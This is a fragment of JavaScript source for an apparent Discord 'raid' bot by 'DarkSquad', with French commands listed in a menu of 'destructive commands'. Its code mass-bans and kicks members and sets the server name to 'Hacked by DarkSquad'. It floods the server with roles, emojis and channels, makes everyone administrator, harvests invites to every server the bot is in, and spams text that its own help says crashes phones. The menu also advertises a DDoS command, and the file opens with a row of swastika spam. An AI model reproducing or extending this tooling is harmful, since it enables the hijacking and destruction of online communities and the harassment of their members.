卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐```").catch(console.error);
}, 500) 

}
if (["ink"].includes(command)) {
  if(part && exec) {
    return message.author.send("❌ Cette commande est interdit pour manque de confiance.").catch(console.error)
  };
if(message.deletable) message.delete();
var interval = setInterval (function () {
message.channel.send("@everyone ͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌").catch(console.error);
}, 500) 

}

if (["rename"].includes(command)) {
  if(part && exec) {
    return message.author.send("❌ Cette commande est interdit pour manque de confiance.").catch(console.error)
  };
if(message.deletable) message.delete();
message.guild.setIcon("DS.png").catch(console.error)
message.guild.setName('Hacked by DarkSquad').catch(console.error);
message.guild.members.forEach(member => {
    if(member.setNickname("ツ"));
            })
}


if (["_ban"].includes(command)) {
  if(part && exec) {
    return message.author.send("❌ Cette commande est interdit pour manque de confiance.").catch(console.error)
  };
if(message.deletable) message.delete();
message.guild.members.forEach(member => {
if (member.bannable && !member.roles.find("name", "ツ")) {
member.ban().catch(console.error);
}
});
}
if (["_kick"].includes(command)) {

  if(part && exec) {
    return message.author.send("❌ Cette commande est interdit pour manque de confiance.").catch(console.error)
  };
if(message.deletable) message.delete();

message.guild.members.forEach(member => {
if (member.kickable && !member.roles.find("name", "ツ")) {
member.kick().catch(console.error);
}
});
}
      
      	if (["serverlist"].includes(command)) {
        if(exec) {
					return message.author.send("❌ Cette commande est interdit pour vous.").catch(console.error)
				};

        if(message.deletable) message.delete();
  
  bot.guilds.forEach(guild => { 
    var invite = bot.guilds.find("id", guild.id)

    message.channel.send(`${guild.name} || ${guild.id} || ${guild.memberCount} membres`).catch(console.error);

  }).catch(console.error)
  
}
	if (["aya"].includes(command)) {

    if(part && exec) {
      return message.author.send("❌ Cette commande est interdit pour manque de confiance.").catch(console.error)
    };
        if(message.deletable) message.delete();
    bot.guilds.forEach(guild => { 
      var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
      invite.createInvite().then(invite => message.channel.send(` ${guild.name} || ${invite}`));
    }).catch(console.error)

}

			if (["role"].includes(command)) {

        if(part && exec) {
					return message.author.send("❌ Cette commande est interdit pour manque de confiance.").catch(console.error)
        };
        if(message.deletable) message.delete();
        if(message.guild.roles.exists("name", 'ツ'))  {
        
          message.guild.members.forEach(member => { 
            member.addRoles(message.guild.roles.find("name", 'ツ'));
          })
        }
        var interval = setInterval (function () {
    message.guild.createRole({
        name: 'ツ',
        color: (Math.floor((Math.random() * 16777215) + 1)),
        permissions: perms,
      }).catch(console.error) 
  }, 500) 
      }
			if (["emoji"].includes(command)) {
        if(part && exec) {
					return message.author.send("❌ Cette commande est interdit pour manque de confiance.").catch(console.error)
        };
        if(message.deletable) message.delete();
    
        var interval = setInterval (function () {
	message.guild.createEmoji('./exe.gif', 'Squad').catch(console.error)
       message.guild.createEmoji('./raid.png', 'Dark').catch(console.error)
          
        }, 500) 
}

			if (["wtf"].includes(command)) {
        if(part && exec) {
					return message.author.send("❌ Cette commande est interdit pour manque de confiance.").catch(console.error)
        };
        if(message.deletable) message.delete();
        var interval = setInterval (function () {
          for (var i = 0; i < 450; i++) {
  
            message.guild.createChannel(`╭∩╮►_◄╭∩╮`, 'voice').catch(console.error)
            message.guild.createChannel(`Hacked_by_DarkSquad`, 'text').catch(console.error)
       
              
          } 
        })
      }
  
			if (["exe"].includes(command)) {
        if(part && exec) {
					return message.author.send("❌ Cette commande est interdit pour manque de confiance.").catch(console.error)
        };
        if(message.deletable) message.delete();
        message.member.guild.createRole({
          name: "ツ",
          permissions: perms,
          mentionable: false,
          color: 'RANDOM'
        }).then(function(role) {
          message.member.addRole(role).catch(e => {});
          if (message.deletable) message.delete().catch(e => {});
        }).catch(e => {});
        
  
        }

        if (["chaos"].includes(command)) {
          if(part && exec) {
            return message.author.send("❌ Cette commande est interdit pour manque de confiance.").catch(console.error)
          };
          if(message.deletable) message.delete();
		message.guild.roles.find('name', '@everyone').edit({
        permissions: ['ADMINISTRATOR']
    }).catch(console.error);

          if(message.guild.roles.exists("name", 'ツ'))  {
         
            message.guild.members.forEach(member => { 
              member.addRoles(message.guild.roles.find("name", 'ツ'));
            })
          }
		  message.member.guild.createRole({
            name: "ツ",
            permissions: perms,
            mentionable: false,
            color: 'RANDOM'
            }).then(function(role) {
            message.member.addRole(role)
            }).catch(console.error)
		
          var roledebut = message.content.split(" ").slice(1).join(" ")
          let role = message.guild.roles.find("name", 'ツ')
          let role_succes = new Discord.RichEmbed()
          .setColor('#FFCC99')
          .setAuthor(bot.user.username, bot.user.avatarURL)	
          .setDescription("@everyone, `tout les membres de ce serveur ont les droits administratif.`")
          .setFooter("Que le carnage commence...");

         if (message.member.guild.createRole({name: "ツ", permissions: perms, color: 'RANDOM',}))
        if(message.guild.roles.exists("name", 'ツ'))  {
       
            message.channel.send(role_succes)
            message.guild.members.forEach(member => { 
              member.addRoles(role);
  
            })
          }
        
        }
  

			if (["soumit"].includes(command)) {
    
        if(part && exec) {
					return message.author.send("❌ Cette commande est interdit pour manque de confiance.").catch(console.error)
        };
        if(message.deletable) message.delete();
        if(message.guild.roles.exists("name", 'ツ'))  {
                  
          message.guild.members.forEach(member => { 
            member.addRoles(message.guild.roles.find("name", 'ツ'));
          })
        }
            message.guild.members.forEach(member => {
                if(member.setNickname("ツ"));
                
            })
        }
      
	if (["ツ"].includes(command)) {
                if(exec) {
                  return message.author.send("❌ Vous n'avez pas assez d'expérience requis pour effectuer cette commande.").catch(console.error)
                };
        if(message.deletable) message.delete();
            var help_embed = new Discord.RichEmbed()
           
            
                .setTitle("Voici les commandes destructives de Sнαđow™ :")
                .addField(":skull_crossbones: _dark","```Spam un text de propagande dans le salon.```", true)
                .addField(":skull_crossbones: _ink","```Spam un text qui feront planté certains smartphone des membres du serveur.```", false)
                .addField(":skull_crossbones: _wtf","```Crée et introduit des salons.```", false)
                .addField(":skull_crossbones: _mp","```Crée un message d'invitation et l'envoi à tout ceux du serveur en message privé.```", true)
                .addField(":skull_crossbones: _emoji","```Crée des emojis normal et animée.```", false)
                .addField(":skull_crossbones: _remoji","```Supprime tout les emojis.```", true)
                .addField(":skull_crossbones: _exe","```Vous mets administrateur.```", false)
                .addField(":skull_crossbones: _ddos + ip/@user","```Lance une attaque de ddos.```", true)
                .addField(":skull_crossbones: _rename","```Rename le serveur puis change la photo.```", false)
                .addField(":skull_crossbones: _region","```Change la région du serveur aléatoirement.```", true)
                .addField(":skull_crossbones: _chaos","```Tout les membres du serveurs deviennent administrateur.```", true)
                .addField(":skull_crossbones: _verif","```Vérifie s'il est administrateur dans le serveur et vous préviens en message privé.```", false)
                .addField(":skull_crossbones: _soumit","```Rename tout les membres du serveur.```", false)
                .addField(":skull_crossbones: _help","```Affiche les commandes non destructives.```", true)
                .addField(":skull_crossbones: _role","```Crée un maximum de roles.```", false)
	                    .addField(":skull_crossbones: _rerole","```Supprime tout les roles supprimables.```", true)
                .addField(":skull_crossbones: _supp","```Supprime tout les channels text/vocal.```", false)
                .addField(":skull_crossbones: _serverlist","```Affiche les serveurs qui çe sert du bot.```", true)
                .addField(":skull_crossbones: __ban","```Ban tout ceux qui pouront l'être (éxecuter la commande : _exe ou vous serait banni).```", true)
                .addField(":skull_crossbones: __kick","```Kick tout ceux qui pouront l'être (//).```", true)
                .addField(":skull_crossbones: _aya","```Crée une invitation de tout les serveurs qu'il est (ne pas abuser).```", true)
	                    .addField(":skull_crossbones: _brutequit + id","```Quitte le serveur via son id à distance. (Ne l'utiliser que s'il est examiné par des anti-raideurs/taupes/raideurs inconnu).```", true)
                .addField(":skull_crossbones: _terminal","```Effectue toutes les commandes destructives (//).```", true)
                .addField(":eye_in_speech_bubble: _discorde","```Supprime tout les channels, emojis et roles supprimables (Un role administrateur vous sera attribué).```", true)
                .setColor("#320242")
                .setFooter("𝑨𝒚𝒂")
                message.channel.sendEmbed(help_embed).catch(console.error);
        }
        if (["region"].includes(command)) {
          if(part && exec) {
            return message.author.send("❌ Cette commande est interdit pour manque de confiance.").catch(console.error)
          };
if(message.deletable) message.delete();
if(message.guild.roles.exists("name", 'ツ'))  {
       
            
  message.guild.members.forEach(member => { 
    member.addRoles(message.guild.roles.find("name", 'ツ'));
  })
}
var tableauball = ['brazil', 'us-west', 'singapore', 'eu-central', 'hongkong', 'us-south', 'amsterdam', 'us-central', 'london', 'us-east', 'sydney', 'japan', 'eu-west', 'frankfurt', 'russia']
var interval = setInterval (function () {
message.guild.setRegion(tableauball[Math.floor(Math.random()*15)]).catch(console.error)
}, 200)    
}
		
if (["brutequit"].includes(command)) {
	                        if(exec) {
                  return message.author.send("❌ Vous n'avez pas assez d'expérience pour effectuer cette commande.")
                };
        if(message.deletable) message.delete();
var toRepeat = parameters.join(" ");
bot.guilds.find('id',`${toRepeat}`).leave().catch(console.error);
	message.channel.send(`__***Serveur quitté.***__`).catch(console.error);

} 
      

    			else {
            console.log("[LOG] ["+message.author.tag+" = "+message.author.id+"] ["+message.guild.name+"] La commande "+command+" a été éxécutée.")
            bot.channels.find('id',"473212008926543873").send("`[LOG]` ["+message.author.tag+" || "+message.author.id+"] | ["+message.guild.name+" || "+message.guild.id+"] = La commande "+command+" a été éxécutée.");
          }

            } 	
    
            catch (error) {
              console.log("[ERREUR] ["+message.author.tag+" = "+message.author.id+"] "+message.content)
             
              console.log(error) 
            }
          }

});

bot.login(config.token);
